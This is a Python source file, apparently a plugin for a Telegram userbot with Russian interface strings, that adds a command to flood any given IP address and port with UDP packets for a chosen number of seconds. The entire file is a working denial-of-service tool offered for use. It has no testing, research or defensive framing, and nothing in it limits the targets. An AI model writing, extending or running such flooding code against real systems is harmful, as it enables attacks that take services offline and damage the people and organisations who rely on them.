import socket
import asyncio
from telethon.tl.types import Message
from .. import loader, utils

@loader.tds
class UdpFloodModule(loader.Module):
    """Модуль для интенсивной отправки UDP пакетов"""

    strings = {
        "name": "UDP Flood",
        "start": "<b>🚀 Начинаем интенсивную отправку пакетов на {}:{} на {} секунд ({} пакетов за раз)...</b>",
        "complete": "<b>✅ Отправка пакетов завершена.</b>",
        "error": "<b>Ошибка:</b> Некорректные аргументы."
    }

    async def client_ready(self, client, db):
        self.client = client

    async def udpcmd(self, message: Message):
        """[ip] [port] [sec] [packets] - Отправляет UDP пакеты на указанный IP и порт на заданное количество секунд"""
        args = utils.get_args_raw(message)
        if len(args.split()) != 4:
            await utils.answer(message, self.strings("error"))
            return

        ip, port, sec, packets = args.split()
        try:
            port = int(port)
            sec = int(sec)
            packets = int(packets)
        except ValueError:
            await utils.answer(message, self.strings("error"))
            return

        await utils.answer(message, self.strings("start").format(ip, port, sec, packets))
        await self.udp_flood(ip, port, sec, packets)
        await utils.answer(message, self.strings("complete"))

    async def udp_flood(self, ip, port, duration, packet_count):
        """ Функция для интенсивной отправки UDP пакетов """
        start_time = asyncio.get_event_loop().time()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while True:
                if (asyncio.get_event_loop().time() - start_time) > duration:
                    break
                tasks = [self.send_packet(sock, ip, port) for _ in range(packet_count)]
                await asyncio.gather(*tasks)

    async def send_packet(self, sock, ip, port):
        """ Отправляет одиночный UDP пакет """
        try:
            sock.sendto(b'RandomData', (ip, port))
        except Exception as e:
            print(f"Ошибка отправки: {e}")

# Пример создания и использования модуля
module = UdpFloodModule()
